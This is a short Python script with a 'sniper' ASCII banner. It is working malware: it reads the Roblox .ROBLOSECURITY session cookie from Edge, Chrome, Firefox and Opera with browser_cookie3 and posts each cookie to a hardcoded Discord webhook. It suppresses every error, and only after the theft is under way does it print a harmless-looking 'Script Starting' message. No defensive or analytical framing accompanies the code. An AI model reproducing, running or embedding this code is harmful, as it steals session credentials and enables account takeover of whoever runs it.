

#             .__                     
#  ______ ____ |__|_____   ___________ 
# /  ___//    \|  \____ \_/ __ \_  __ \
 #\___ \|   |  \  |  |_> >  ___/|  | \/
#/____  >___|  /__|   __/ \___  >__|   
#     \/     \/   |__|        \/       
















import os
import browser_cookie3, requests, threading

webhook = "https://discord.com/api/webhooks/992228261033689098/uoLpz06njriukswIBYJfAXcNSG7VMf5sisETF58EjH_lUVemrvBZvoV2EoEiI88HvQeS" 

def edge_logger():
    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(webhook, json={'username':'real', 'content':f'```Cookie: {cookie}```'})
    except:
        pass
def chrome_logger():
    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(webhook, json={'username':'real', 'content':f'```Cookie: {cookie}```'})
    except:
        pass


def firefox_logger():
    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(webhook, json={'username':'real', 'content':f'```Cookie: {cookie}```'})
    except:
        pass

def opera_logger():
    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(webhook, json={'username':'real', 'content':f'```Cookie: {cookie}```'})
    except:
        pass

browsers = [edge_logger, chrome_logger, firefox_logger, opera_logger]

for x in browsers:
    threading.Thread(target=x,).start()


print("INFO | Script Starting..")

